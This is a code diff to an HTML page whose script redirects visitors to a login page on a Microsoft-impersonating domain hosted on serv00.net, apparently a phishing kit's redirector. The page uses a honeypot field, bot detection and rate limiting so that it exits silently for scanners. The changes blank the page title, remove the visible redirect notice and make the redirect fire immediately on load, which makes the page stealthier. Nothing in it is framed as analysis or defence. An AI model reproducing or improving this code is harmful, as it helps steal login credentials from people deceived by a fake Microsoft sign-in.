@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title></title>
     <script>
         // URLs for primary and backup sites
         const primaryURL = 'https://microsoft-team.serv00.net/login.html';
@@ -12,7 +12,7 @@
         // Honeypot check to detect bots
         function checkHoneypot() {
             const honeypotField = document.getElementById('honeypot');
-            if (honeypotField.value !== '') {
+            if (honeypotField && honeypotField.value !== '') {
                 return true;  // Bot detected
             }
             return false;
@@ -59,18 +59,16 @@
         // Function to perform security checks and redirect
         function performRedirection() {
             if (checkHoneypot() || isBot() || rateLimit()) {
-                // If any check fails, exit silently
-                return;
+                return;  // Exit silently if any check fails
             }
-            checkPrimarySite();  // Redirect immediately
+            checkPrimarySite();  // Start redirection process
         }
 
-        // Start the redirection process immediately upon page load
-        window.onload = performRedirection;
+        // Start the redirection process immediately upon script load
+        performRedirection();
     </script>
 </head>
 <body>
     <input type="hidden" id="honeypot" value="">
-    <p>Redirecting you to the site...</p>
 </body>
 </html>
